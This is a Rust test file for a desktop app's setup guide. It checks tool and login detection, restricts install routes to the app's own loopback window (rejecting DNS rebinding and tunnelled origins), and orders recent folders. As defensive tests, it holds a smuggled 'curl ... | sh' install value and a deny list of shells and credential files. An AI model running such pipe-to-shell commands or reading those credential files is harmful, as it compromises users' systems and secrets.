//! The first-run guide as this server runs it, where `droppen-setup` cannot:
//! on Claude Code's and Codex's own logins (`app::logins()`), the server's
//! state and routes, and its session readers. The guide's own tests, on
//! stand-in logins, are the crate's.

mod detect {
    //! What the guide's detection asks, and Claude Code's own login reading the
    //! answer.

    use std::sync::Arc;

    use droppen_base::process_env::Env;
    use droppen_setup::detect::*;
    use droppen_setup::runner::fixture::Fixture;
    use droppen_setup::runner::{RunOutput, Runner};
    use droppen_setup::testing::marker;
    use droppen_setup::{GitState, InstallMethod, LoginState};

    /// A temp home with a native claude and an npm codex, and a fixture that
    /// answers every question detection is allowed to ask.
    fn scene() -> (tempfile::TempDir, Probe, Arc<Fixture>) {
        let home = tempfile::tempdir().expect("tempdir");
        let bin = home.path().join(".local/bin");
        let claude = home.path().join(".local/share/claude/versions/2.1.300");
        marker(&claude);
        std::fs::create_dir_all(&bin).expect("bin");
        std::os::unix::fs::symlink(&claude, bin.join("claude")).expect("link");
        let codex = home.path().join("npm/lib/node_modules/@openai/codex/bin/codex.js");
        marker(&codex);
        std::os::unix::fs::symlink(&codex, bin.join("codex")).expect("link");
        marker(&bin.join("node"));
        marker(&bin.join("brew"));

        let env: Env = [("PATH".to_string(), bin.to_string_lossy().into_owned())].into_iter().collect();
        let probe = Probe {
            home: home.path().to_path_buf(),
            env: env.clone(),
            claude_env: env,
            inherited_path: bin.to_string_lossy().into_owned(),
            overlay: Vec::new(),
            system_dirs: Vec::new(),
            macos: true,
        };
        let fixture = Fixture::new();
        fixture
            .answer("sw_vers -productVersion", RunOutput::exited(0, "15.3\n", ""))
            .answer("xcode-select -p", RunOutput::exited(2, "", "xcode-select: error"))
            .answer("node --version", RunOutput::exited(0, "v22.3.0\n", ""))
            .answer("claude --version", RunOutput::exited(0, "2.1.300 (Claude Code)\n", ""))
            .answer(
                "claude auth status --json",
                RunOutput::exited(0, r#"{"loggedIn":true,"authMethod":"claude.ai","subscriptionType":"pro"}"#, ""),
            )
            .answer("codex --version", RunOutput::exited(0, "codex-cli 0.163.0\n", ""))
            .answer(
                "codex login status",
                RunOutput::exited(0, "", "Logged in using an API key - sk-proj-****abcd\n"),
            )
            .answer_rpc("account/read", serde_json::json!({"account": {"type": "apiKey"}}));
        (home, probe, fixture)
    }

    #[test]
    fn claude_s_status_reads_signed_in_signed_out_and_a_banner() {
        let claude = crate::app::logins().claude;
        let signed_in = RunOutput::exited(
            0,
            r#"{"loggedIn":true,"authMethod":"claude.ai","email":"ada@example.com","subscriptionType":"max","rateLimitTier":"default_claude_max_20x"}"#,
            "",
        );
        let login = claude_login(&signed_in, &*claude);
        assert_eq!(login.state, LoginState::SignedIn);
        assert_eq!(login.method.0.as_deref(), Some("claude.ai"));
        assert_eq!(login.plan.0.as_deref(), Some("Max 20x"));
        assert_eq!(login.email.0.as_deref(), Some("ada@example.com"));
        assert_eq!(login.usable.0, Some(true));

        let banner = RunOutput::exited(
            0,
            "Update available! Run claude update\n{\"loggedIn\": true, \"authMethod\": \"console\"}\nThanks\n",
            "",
        );
        let login = claude_login(&banner, &*claude);
        assert_eq!(login.state, LoginState::SignedIn);
        assert_eq!(login.method.0.as_deref(), Some("console"));
        assert_eq!(login.plan.0, None, "a Console login has no subscription to name");
        assert_eq!(login.usable.0, None, "and says nothing about one");

        let out = claude_login(&RunOutput::exited(1, r#"{"loggedIn":false,"authMethod":"none"}"#, ""), &*claude);
        assert_eq!(out.state, LoginState::SignedOut);
        assert_eq!(out.method.0, None);

        let free = claude_login(
            &RunOutput::exited(0, r#"{"loggedIn":true,"authMethod":"claude.ai","subscriptionType":"free"}"#, ""),
            &*claude,
        );
        assert_eq!(free.usable.0, Some(false), "H9: a free plan does not include Claude Code");
        assert_eq!(free.plan.0.as_deref(), Some("Free"));

        assert_eq!(claude_login(&RunOutput::timeout(), &*claude).state, LoginState::Unknown);
        assert_eq!(claude_login(&RunOutput::failed_to_start(), &*claude).state, LoginState::Unknown);
        assert_eq!(claude_login(&RunOutput::exited(2, "", "boom"), &*claude).state, LoginState::Unknown);
    }

    #[tokio::test]
    async fn detection_asks_exactly_these_questions_and_nothing_that_reads_a_credential() {
        let (_home, probe, fixture) = scene();
        let runner: Arc<dyn Runner> = fixture.clone();
        let detection = detect(&runner, &probe, &*crate::app::logins().claude).await;

        let mut lines = fixture.lines();
        lines.sort();
        assert_eq!(
            lines,
            [
                "claude --version",
                "claude auth status --json",
                "codex --version",
                "codex app-server account/read",
                "codex login status",
                "node --version",
                "sw_vers -productVersion",
                "xcode-select -p",
            ]
        );
        for asked in fixture.asked() {
            assert!(asked.stdin.is_none(), "detection pipes nothing into {}", asked.line());
            assert!(asked.program.starts_with('/'), "every program is run by its full path: {}", asked.program);
            assert!(
                !["security", "cat", "git", "sh", "bash", "zsh", "open"].contains(&asked.name.as_str()),
                "detection must not run {}",
                asked.line()
            );
            for arg in &asked.args {
                for secret in [".credentials.json", ".claude.json", "auth.json", "/usage"] {
                    assert!(!arg.contains(secret), "{} names {secret}", asked.line());
                }
            }
        }

        assert_eq!(detection.os.macos.0.as_deref(), Some("15.3"));
        assert!(detection.helpers.brew);
        assert_eq!(detection.helpers.node.0.as_deref(), Some("22.3.0"));
        assert_eq!(detection.helpers.git, GitState::Missing);
        let claude = &detection.tools[0];
        assert_eq!(claude.found.as_ref().map(|found| found.method), Some(InstallMethod::Native));
        assert_eq!(claude.version.as_deref(), Some("2.1.300"));
        assert!(claude.supported);
        assert_eq!(claude.login.plan.0.as_deref(), Some("Pro"));
        let codex = &detection.tools[1];
        assert_eq!(codex.found.as_ref().map(|found| found.method), Some(InstallMethod::Npm));
        assert_eq!(codex.login.method.0.as_deref(), Some("apiKey"));
    }
}

mod guide {
    //! The guide on this server: its desktop-window gate and install routes as the
    //! server serves them, and Claude Code's and Codex's own logins answering it.

    use std::net::SocketAddr;
    use std::os::unix::fs::PermissionsExt;
    use std::sync::Arc;

    use droppen_http::app_window::Caller;
    use droppen_http::identity::AuthIdentity;
    use droppen_instance::paths::Paths;
    use droppen_setup::runner::fixture::Fixture;
    use droppen_setup::runner::{self, RunOutput};
    use droppen_setup::testing::{guide_with_logins, marker};
    use droppen_setup::{Setup, ToolId};
    use gotcha::axum::http::StatusCode;

    /// What the app's own window sends: from loopback, signed in, to and from
    /// `127.0.0.1:<port>`.
    fn window(port: u16) -> Caller {
        Caller {
            peer: Some("127.0.0.1:50123".parse().expect("address")),
            identity: Some(AuthIdentity {
                username: "ada".to_string(),
                token_sha256: None,
            }),
            origin: Some(format!("http://127.0.0.1:{port}")),
            host: Some(format!("127.0.0.1:{port}")),
        }
    }

    #[tokio::test]
    async fn only_the_app_s_own_window_counts_as_the_app() {
        let home = tempfile::tempdir().expect("tempdir");
        let mut state = crate::api::test_support::state(home.path()).await;
        let port = 58123;
        assert!(state.window().app_caller(&window(port)).is_err(), "not run by the desktop app");
        state.desktop_app = true;
        assert!(state.window().app_caller(&window(port)).is_err(), "before the server listens, nothing is its window");
        let _ = state.listen_port.set(port);

        assert!(state.window().app_caller(&window(port)).is_ok());
        for peer in ["[::1]:50123", "[::ffff:127.0.0.1]:50123"] {
            let caller = Caller {
                peer: Some(peer.parse().expect("address")),
                ..window(port)
            };
            assert!(state.window().app_caller(&caller).is_ok(), "{peer}");
        }

        let refused = |caller: Caller, why: &str| {
            let error = state.window().app_caller(&caller).expect_err(why);
            assert_eq!(error.status(), StatusCode::FORBIDDEN, "{why}");
            assert_eq!(error.body()["error"], "app_only", "{why}");
        };
        refused(
            Caller {
                peer: Some("192.168.1.20:50123".parse().unwrap()),
                ..window(port)
            },
            "a browser on the LAN",
        );
        refused(Caller { peer: None, ..window(port) }, "no peer is not a local peer");
        refused(Caller { identity: None, ..window(port) }, "the app's window is always signed in");
        refused(
            Caller {
                identity: Some(AuthIdentity {
                    username: "cloud:d-abc".to_string(),
                    token_sha256: None,
                }),
                ..window(port)
            },
            "a linked device's request arrives over loopback and is still not this device",
        );
        refused(
            Caller {
                origin: Some("http://evil.example:58123".into()),
                host: Some("evil.example:58123".into()),
                ..window(port)
            },
            "DNS rebinding: a page elsewhere whose name now points at 127.0.0.1",
        );
        refused(
            Caller {
                origin: Some("http://127.0.0.1:9000".into()),
                host: Some("127.0.0.1:9000".into()),
                ..window(port)
            },
            "a browser through `ssh -R 9000:127.0.0.1:58123`, arriving over loopback",
        );
        refused(
            Caller {
                origin: Some("https://mac.tail1234.ts.net".into()),
                host: Some("mac.tail1234.ts.net".into()),
                ..window(port)
            },
            "a browser through `tailscale serve`",
        );
        refused(
            Caller {
                origin: Some("http://localhost:58123".into()),
                ..window(port)
            },
            "made by a page somewhere else",
        );
        refused(Caller { origin: None, ..window(port) }, "an action without its Origin");

        // The report's `canInstall`: a page's own GET says no Origin, and
        // needs none; everything else still holds.
        assert!(state.window().local_app_request(&Caller { origin: None, ..window(port) }));
        assert!(!state.window().local_app_request(
            &Caller {
                origin: None,
                host: Some("evil.example:58123".into()),
                ..window(port)
            }
        ));
        assert!(!state.window().local_app_request(&Caller { identity: None, ..window(port) }));
    }

    /// Through the real router and its guard, from a real loopback socket.
    /// Nothing here reaches a command: every request is refused before one.
    #[tokio::test]
    async fn the_install_routes_refuse_everything_but_the_app_and_the_whitelist() {
        let client = reqwest::Client::new();
        // `token`: the bearer the app's window holds; the window's page sends
        // its own address as `Origin`, and reqwest sends `Host` from the URL.
        let send = |addr: SocketAddr, path: &'static str, body: serde_json::Value, token: Option<String>, origin: bool| {
            let client = client.clone();
            async move {
                let mut request = client.post(format!("http://{addr}{path}")).json(&body);
                if let Some(token) = token {
                    request = request.bearer_auth(token);
                }
                if origin {
                    request = request.header("Origin", format!("http://{addr}"));
                }
                let response = request.send().await.expect("answered");
                let status = response.status().as_u16();
                (status, response.json::<serde_json::Value>().await.unwrap_or_default())
            }
        };
        let routes = [
            ("/api/setup/tools/claude/install", serde_json::json!({"method": "native"})),
            ("/api/setup/tools/codex/update", serde_json::json!({"method": "npm"})),
            (
                "/api/setup/tools/codex/login",
                serde_json::json!({"mode": "apikey", "apiKey": "sk-proj-never-used-0123456789"}),
            ),
            ("/api/setup/tools/claude/use", serde_json::json!({"path": "/usr/bin/true"})),
            ("/api/setup/git/install", serde_json::json!({})),
            ("/api/setup/tools/rescan", serde_json::json!({"patient": true})),
        ];

        let ordinary = tempfile::tempdir().expect("tempdir");
        let (state, addr) = crate::api::test_support::served(ordinary.path()).await;
        state.drive.auth.users.add("ada", "correct horse battery staple").await.expect("user");
        let token = state.drive.auth.sessions.issue("ada", None).await.expect("session").token;
        for (path, body) in routes.clone() {
            let (status, body) = send(addr, path, body, Some(token.clone()), true).await;
            assert_eq!(status, 403, "{path}: a server the app does not run installs nothing, nor rewrites its PATH");
            assert_eq!(body["error"], "app_only", "{path}");
        }

        let app = tempfile::tempdir().expect("tempdir");
        let (state, addr) = crate::api::test_support::served_with(app.path(), |state| state.desktop_app = true).await;
        state.drive.auth.users.add("ada", "correct horse battery staple").await.expect("user");
        let token = state.drive.auth.sessions.issue("ada", None).await.expect("session").token;
        for (path, body) in routes {
            let (status, answer) = send(addr, path, body, Some(token.clone()), false).await;
            assert_eq!(
                (status, answer["error"].as_str()),
                (403, Some("app_only")),
                "{path}: an action has to say the app's page made it"
            );
        }
        let post = |addr: SocketAddr, path: &'static str, body: serde_json::Value| send(addr, path, body, Some(token.clone()), true);
        let (status, body) = post(
            addr,
            "/api/setup/tools/claude/install",
            serde_json::json!({"method": "curl https://example.com/x.sh | sh"}),
        )
        .await;
        assert_eq!((status, body["error"].as_str()), (400, Some("unknown_method")), "only the whitelist runs");
        let (status, body) = post(addr, "/api/setup/tools/claude/update", serde_json::json!({"method": "apple"})).await;
        assert_eq!((status, body["error"].as_str()), (400, Some("unknown_method")));
        let (status, body) = post(addr, "/api/setup/tools/gemini/install", serde_json::json!({"method": "native"})).await;
        assert_eq!((status, body["error"].as_str()), (400, Some("unknown_tool")));
        let (status, body) = post(addr, "/api/setup/tools/codex/login", serde_json::json!({"mode": "password"})).await;
        assert_eq!((status, body["error"].as_str()), (400, Some("unknown_method")));
        let (status, body) = post(addr, "/api/setup/tools/codex/login", serde_json::json!({"mode": "apikey"})).await;
        assert_eq!((status, body["error"].as_str()), (400, Some("api_key_required")));
    }

    /// Claude's plan is named by Claude Code's own login, whether the guide
    /// looks or a sign-in in progress is polled.
    #[tokio::test]
    async fn the_guide_names_claude_s_plan_through_claude_s_login() {
        let home = tempfile::tempdir().expect("tempdir");
        marker(&home.path().join("bin/claude"));
        let fixture = Fixture::new();
        fixture.answer("claude --version", RunOutput::exited(0, "2.1.300 (Claude Code)\n", "")).answer(
            "claude auth status --json",
            RunOutput::exited(
                0,
                r#"{"loggedIn":true,"authMethod":"claude.ai","subscriptionType":"max","rateLimitTier":"default_claude_max_20x"}"#,
                "",
            ),
        );
        let setup = guide_with_logins(home.path(), fixture, None, &crate::app::logins());

        let detection = setup.detection(true).await;
        assert_eq!(detection.tools[0].login.plan.0.as_deref(), Some("Max 20x"));
        assert_eq!(setup.poll_login(ToolId::Claude).await.plan.0.as_deref(), Some("Max 20x"));
    }

    /// The guide the entry builds asks codex's app server through codex's own
    /// login: one real conversation with the stand-in app server
    /// (`tests/support/fake_codex.py`), which answers every request with `{}`.
    #[tokio::test]
    async fn the_guide_asks_codex_s_app_server_through_codex_s_login() {
        let home = tempfile::tempdir().expect("tempdir");
        // The stand-in app server runs only under a test root.
        std::fs::write(home.path().join(".rh-test-root"), b"").expect("test root");
        let codex = home.path().join("codex");
        let fake = concat!(env!("CARGO_MANIFEST_DIR"), "/tests/support/fake_codex.py");
        std::fs::write(&codex, format!("#!/bin/sh\nexec python3 {fake} \"$@\"\n")).expect("codex");
        std::fs::set_permissions(&codex, std::fs::Permissions::from_mode(0o755)).expect("chmod");
        let setup = Setup::new(Arc::new(Paths::new(home.path().to_path_buf())), &crate::app::logins());

        let answer = setup
            .runner()
            .rpc(runner::RpcCall {
                program: codex,
                cwd: home.path().to_path_buf(),
                env: droppen_base::process_env::clean_env_bare(),
                method: "account/read",
                timeout: std::time::Duration::from_secs(10),
            })
            .await;
        assert_eq!(answer, Some(serde_json::json!({})), "the app server's answer");
        let asked = std::fs::read_to_string(home.path().join("codex-stdin.jsonl")).expect("the app server was started");
        assert!(asked.contains("\"method\":\"account/read\""), "{asked}");
    }
}

mod folders {
    //! Recent folders, read through this server's session readers.

    use std::path::Path;

    use droppen_http::openapi_ext::Nullable;
    use droppen_sessions::{SessionScope, SessionSummary, Source};
    use droppen_setup::folders::*;

    fn session(cwd: &str, source: Source, scope: SessionScope, updated_at: &str) -> SessionSummary {
        let mut row: SessionSummary = serde_json::from_value(serde_json::json!({
            "pinned": false, "id": "s", "source": "claude", "scope": "owned", "server": "s", "title": "t",
            "cwd": null, "repoKey": null, "gitBranch": null, "updatedAt": "", "createdAt": "",
            "sizeBytes": 1, "filePath": "/x", "status": "idle", "activity": "idle", "resident": null,
            "claudeRoot": null, "accountId": null, "attentionAt": null, "unread": false, "unreadCount": 0,
        }))
        .unwrap_or_else(|error| panic!("a session row: {error}"));
        row.cwd = Nullable(Some(cwd.to_string()));
        row.source = source;
        row.scope = scope;
        row.updated_at = updated_at.to_string();
        row
    }

    #[test]
    fn recent_folders_are_grouped_newest_first_and_only_those_still_there() {
        let sessions = [
            session("/w/site", Source::Claude, SessionScope::External, "2026-10-10T00:00:00Z"),
            session("/w/site", Source::Codex, SessionScope::Owned, "2026-10-18T00:00:00Z"),
            session("/w/site", Source::Claude, SessionScope::Owned, "2026-10-01T00:00:00Z"),
            session("/w/api", Source::Codex, SessionScope::External, "2026-10-19T00:00:00Z"),
            session("/w/gone", Source::Claude, SessionScope::Owned, "2026-10-20T00:00:00Z"),
            session("", Source::Claude, SessionScope::Owned, "2026-10-20T00:00:00Z"),
        ];
        let transcripts = crate::app::transcript_sources();
        let folders = recent_from(&sessions, &transcripts, |path| path != Path::new("/w/gone"));
        assert_eq!(folders.iter().map(|folder| folder.path.as_str()).collect::<Vec<_>>(), ["/w/api", "/w/site"]);
        let site = &folders[1];
        assert_eq!(site.name, "site");
        assert_eq!(site.tools, [FolderTool::Droppen, FolderTool::Claude]);
        assert_eq!(site.sessions, 3);
        assert_eq!(site.last_used.0.as_deref(), Some("2026-10-18T00:00:00Z"));
        assert_eq!(folders[0].tools, [FolderTool::Codex]);

        let many: Vec<SessionSummary> = (0..10)
            .map(|n| session(&format!("/w/p{n}"), Source::Claude, SessionScope::Owned, &format!("2026-10-1{n}T00:00:00Z")))
            .collect();
        let folders = recent_from(&many, &transcripts, |_| true);
        assert_eq!(folders.len(), RECENT_LIMIT);
        assert_eq!(folders[0].path, "/w/p9");
    }

    /// A session this instance did not start is its CLI's when the user runs
    /// that CLI too, and another Droppen's when only Droppen runs it.
    #[test]
    fn a_session_started_elsewhere_names_the_tool_that_ran_it() {
        let transcripts = crate::app::transcript_sources();
        let tool = |source| {
            let sessions = [session("/w/a", source, SessionScope::External, "2026-10-10T00:00:00Z")];
            recent_from(&sessions, &transcripts, |_| true)[0].tools.clone()
        };
        assert_eq!(tool(Source::Claude), [FolderTool::Claude]);
        assert_eq!(tool(Source::Codex), [FolderTool::Codex]);
        assert_eq!(tool(Source::Acp), [FolderTool::Droppen]);
        // The bridge is by wire name, so a source whose sessions are run outside
        // Droppen needs a tool of the same name.
        for reader in transcripts.iter().filter(|reader| reader.foreign_sessions()) {
            let source = reader.source();
            assert_eq!(FolderTool::of(source).map(|tool| serde_json::to_value(tool).expect("json")), Some(serde_json::json!(source.as_str())));
        }
    }
}

mod progress {
    //! Whether the guide opens by itself, asked of this server's own state and
    //! readers.

    use droppen_http::openapi_ext::Nullable;
    use droppen_instance::paths::ClaudeRoot;
    use droppen_setup::progress::*;
    use droppen_setup::SetupState;
    use gotcha::axum::extract::FromRef;

    use crate::provider::claude_code::claude_roots;

    #[tokio::test]
    async fn the_guide_opens_by_itself_only_for_a_new_install_of_the_app() {
        let _index = droppen_sessions::index::exclusive().await;
        let home = tempfile::tempdir().expect("tempdir");
        let mut state = crate::api::test_support::state(home.path()).await;
        let fresh = SetupProgress::default();
        assert!(!answered(&SetupState::from_ref(&state), fresh.clone()).await.auto_open, "not run by the desktop app");

        state.desktop_app = true;
        assert!(answered(&SetupState::from_ref(&state), fresh.clone()).await.auto_open, "the app, never started, no sessions");
        let started = SetupProgress {
            started_at: Nullable(Some("2026-10-19T09:12:00Z".into())),
            ..fresh.clone()
        };
        assert!(!answered(&SetupState::from_ref(&state), started).await.auto_open, "started once: never again by itself");

        // A transcript in the user's own ~/.claude is not this instance's.
        let theirs = claude_roots::ClaudeRoots::of(&state.drive.paths).projects_dir(ClaudeRoot::Local).join("-w");
        std::fs::create_dir_all(&theirs).expect("project dir");
        std::fs::write(
            theirs.join("0b1c2d3e-4f50-4612-8a7b-9c0d1e2f3a4b.jsonl"),
            "{\"type\":\"user\",\"cwd\":\"/w\",\"message\":{\"role\":\"user\",\"content\":\"hello\"}}\n",
        )
        .expect("transcript");
        assert!(answered(&SetupState::from_ref(&state), fresh.clone()).await.auto_open, "an install that only sees the user's own sessions is new");

        // One of its own is an install in use (Q4).
        let ours = claude_roots::ClaudeRoots::of(&state.drive.paths).projects_dir(ClaudeRoot::Managed).join("-w");
        std::fs::create_dir_all(&ours).expect("project dir");
        std::fs::write(
            ours.join("1c2d3e4f-5061-4723-9b8c-0d1e2f3a4b5c.jsonl"),
            "{\"type\":\"user\",\"cwd\":\"/w\",\"message\":{\"role\":\"user\",\"content\":\"hello\"}}\n",
        )
        .expect("transcript");
        assert!(!answered(&SetupState::from_ref(&state), fresh).await.auto_open, "this instance has a session of its own");
    }

    #[tokio::test]
    async fn sessions_the_app_ran_on_the_user_s_own_logins_are_its_own_too() {
        let _index = droppen_sessions::index::exclusive().await;
        let fresh = SetupProgress::default();

        // A Claude session the app started on the user's own login: its
        // transcript is in ~/.claude, beside the user's own, and only the
        // registry says it is this instance's (Q4).
        let home = tempfile::tempdir().expect("tempdir");
        let mut state = crate::api::test_support::state(home.path()).await;
        state.desktop_app = true;
        let local = claude_roots::ClaudeRoots::of(&state.drive.paths).projects_dir(ClaudeRoot::Local).join("-w");
        std::fs::create_dir_all(&local).expect("project dir");
        let id = "2d3e4f50-6172-4834-8c9d-1e2f3a4b5c6d";
        std::fs::write(
            local.join(format!("{id}.jsonl")),
            "{\"type\":\"user\",\"cwd\":\"/w\",\"message\":{\"role\":\"user\",\"content\":\"hello\"}}\n",
        )
        .expect("transcript");
        assert!(answered(&SetupState::from_ref(&state), fresh.clone()).await.auto_open, "the user's own, so far");
        crate::provider::claude_code::sessions::claude::ClaudeCodeSessions.record_owned(&state.drive.paths, id).await.expect("record");
        assert!(!answered(&SetupState::from_ref(&state), fresh.clone()).await.auto_open, "started by this instance on the local login");

        // A Codex thread it started, in the one ~/.codex.
        let home = tempfile::tempdir().expect("tempdir");
        let mut state = crate::api::test_support::state(home.path()).await;
        state.desktop_app = true;
        assert!(answered(&SetupState::from_ref(&state), fresh.clone()).await.auto_open);
        crate::provider::codex::sessions::codex::CodexSessions.record_owned(&state.drive.paths, "0199a3b4-c5d6-7e8f-9a0b-1c2d3e4f5a6b")
            .await
            .expect("record");
        assert!(!answered(&SetupState::from_ref(&state), fresh).await.auto_open, "a Codex thread of its own");
    }
}
